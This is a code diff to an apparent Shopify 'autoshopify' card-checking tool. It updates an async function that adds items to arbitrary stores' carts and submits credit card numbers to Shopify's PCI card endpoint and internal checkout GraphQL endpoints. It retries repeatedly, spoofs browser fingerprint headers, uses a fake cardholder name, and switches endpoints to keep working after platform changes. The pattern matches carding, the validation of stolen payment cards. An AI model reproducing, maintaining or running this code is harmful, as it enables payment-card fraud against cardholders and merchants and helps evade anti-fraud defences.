@@ -715,28 +715,52 @@ async def autoshopify(url, card, session, proxy=None):
 
         # print(f"{product_id}\n{price}\n{site_key}")
         checkout_url = None
-        # Fallback when Storefront API token missing: add to cart via form, then use /checkout
+        # Fallback when Storefront API token missing: add to cart via form, then use /checkout (bulletproof)
         if not site_key or not str(site_key).strip():
-            try:
-                add_headers = {
-                    'User-Agent': getua,
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Origin': url,
-                    'Referer': url,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                }
-                add_resp = await session.post(
-                    f'{url}/cart/add',
-                    headers=add_headers,
-                    data={'id': product_id, 'quantity': 1},
-                    timeout=15,
-                    follow_redirects=True,
-                )
-                if add_resp and getattr(add_resp, 'status_code', 0) in (200, 302):
-                    checkout_url = url.rstrip('/') + '/checkout'
-                    await asyncio.sleep(0.5)
-            except Exception:
-                pass
+            add_headers = {
+                'User-Agent': getua,
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Origin': url.rstrip('/'),
+                'Referer': url.rstrip('/') + '/',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'sec-ch-ua': '"Chromium";v="144", "Not(A:Brand";v="8"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': f'"{clienthint}"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+            }
+            for cart_attempt in range(3):
+                try:
+                    if cart_attempt == 0:
+                        await session.get(url.rstrip('/'), headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, follow_redirects=True, timeout=12)
+                        await asyncio.sleep(0.3)
+                    vid = product_id
+                    try:
+                        if isinstance(vid, str) and vid.isdigit():
+                            vid = int(vid)
+                    except (ValueError, TypeError):
+                        pass
+                    add_resp = await session.post(
+                        f'{url.rstrip("/")}/cart/add',
+                        headers=add_headers,
+                        data={'id': vid, 'quantity': 1},
+                        timeout=18,
+                        follow_redirects=True,
+                    )
+                    sc = getattr(add_resp, 'status_code', 0)
+                    if sc in (200, 302, 303):
+                        checkout_url = url.rstrip('/') + '/checkout'
+                        await asyncio.sleep(0.6)
+                        logger.info(f"Cart/add succeeded for {url} (attempt {cart_attempt + 1})")
+                        break
+                except Exception as e:
+                    logger.debug(f"Cart/add attempt {cart_attempt + 1} failed: {e}")
+                if cart_attempt < 2:
+                    await asyncio.sleep(0.5 + cart_attempt * 0.3)
             if not checkout_url:
                 output.update({
                     "Response": "SITE_ACCESS_TOKEN_MISSING",
@@ -1243,20 +1267,22 @@ async def autoshopify(url, card, session, proxy=None):
         # print(addr["currencyCode"])
 
         headers = {
-            'authority': 'checkout.pci.shopifyinc.com',
             'accept': 'application/json',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'accept-language': 'en-US,en;q=0.6',
             'content-type': 'application/json',
             'origin': 'https://checkout.pci.shopifyinc.com',
-            'referer': 'https://checkout.pci.shopifyinc.com/build/102f5ed/number-ltr.html?identifier=&locationURL=&localFonts[]=%7B%22name%22%3A%22Open%20Sans%22%2C%22source%22%3A%22local(%27Open%20Sans%20Regular%27)%2C%20local(%27OpenSans-Regular%27)%2C%20url(https%3A%2F%2Ffonts.shopifycdn.com%2Fopen_sans%2Fopensans_n4.c32e4d4eca5273f6d4ee95ddf54b5bbb75fc9b61.woff2%3Fvalid_until%3DMTc1NTE3NjM3Mw%26hmac%3D2b44d51c28fee4fdfdf2db1aca3ad92079e1067b1d0cd45b1ce9f498ef288cd4)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Fopen_sans%2Fopensans_n4.5f3406f8d94162b37bfa232b486ac93ee892406d.woff%3Fvalid_until%3DMTc1NTE3NjM3Mw%26hmac%3Dee4c109292549aba1034ba3b403ef92ffda663a41aafcda74028cfda4500d332)%20format(%27woff%27)%22%7D&localFonts[]=%7B%22name%22%3A%22Open%20Sans%22%2C%22source%22%3A%22local(%27Open%20Sans%20Regular%27)%2C%20local(%27OpenSans-Regular%27)%2C%20url(https%3A%2F%2Ffonts.shopifycdn.com%2Fopen_sans%2Fopensans_n4.c32e4d4eca5273f6d4ee95ddf54b5bbb75fc9b61.woff2%3Fvalid_until%3DMTc1NTE3NjM3Mw%26hmac%3D2b44d51c28fee4fdfdf2db1aca3ad92079e1067b1d0cd45b1ce9f498ef288cd4)%20format(%27woff2%27)%2Curl(https%3A%2F%2Ffonts.shopifycdn.com%2Fopen_sans%2Fopensans_n4.5f3406f8d94162b37bfa232b486ac93ee892406d.woff%3Fvalid_until%3DMTc1NTE3NjM3Mw%26hmac%3Dee4c109292549aba1034ba3b403ef92ffda663a41aafcda74028cfda4500d332)%20format(%27woff%27)%22%7D',
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': f'{mobile}',
-            'sec-ch-ua-platform': f'"{clienthint}"',
+            'priority': 'u=1, i',
+            'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html?identifier=&locationURL=',
+            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
+            'sec-fetch-storage-access': 'none',
+            'sec-gpc': '1',
             'user-agent': f'{getua}',
-            }
+        }
         json_data = {
             'credit_card': {
                 'number': cc,
@@ -1266,7 +1292,7 @@ async def autoshopify(url, card, session, proxy=None):
                 'start_month': None,
                 'start_year': None,
                 'issue_number': '',
-                'name': 'Laka Lama',
+                'name': 'maxine df',
             },
             'payment_session_scope': domain,
         }
@@ -1514,7 +1540,7 @@ async def autoshopify(url, card, session, proxy=None):
         for _p1_attempt in range(6):
             # Wrap request with security token (headers only, JSON unchanged for API compatibility)
             # Removed tokenization
-            p1_req = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=json_data, timeout=22)
+            p1_req = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=json_data, timeout=22)
             p1_sc = getattr(p1_req, "status_code", 0)
             p1_text = (p1_req.text or "").strip()
             if p1_sc == 200:
@@ -1753,7 +1779,7 @@ async def autoshopify(url, card, session, proxy=None):
         request = None
         for attempt in range(7):
             # Removed tokenization
-            req = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=json_data, timeout=22)
+            req = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=json_data, timeout=22)
             req_text = (req.text or "").strip()
             req_sc = getattr(req, "status_code", 0)
 
@@ -2334,7 +2360,7 @@ async def autoshopify(url, card, session, proxy=None):
 
         for _sfc_attempt in range(6):
             # Removed tokenization
-            request = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=selected_json_data, timeout=22)
+            request = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=selected_json_data, timeout=22)
             sfc_sc = getattr(request, "status_code", 0)
             if sfc_sc == 200 and "success" in (request.text or ""):
                 break
@@ -2483,7 +2509,7 @@ async def autoshopify(url, card, session, proxy=None):
             await asyncio.sleep(1.0)
             try:
                 # Removed tokenization
-                req2 = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=selected_json_data, timeout=22)
+                req2 = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=selected_json_data, timeout=22)
                 if req2 and hasattr(req2, 'json'):
                     js2 = req2.json()
                     if js2 and isinstance(js2, dict):
@@ -2541,7 +2567,7 @@ async def autoshopify(url, card, session, proxy=None):
 
         for i in range(2):
             # Removed tokenization
-            request = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=json_data, timeout=18)
+            request = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=json_data, timeout=18)
             if i == 0:
                 await asyncio.sleep(1.2)
         
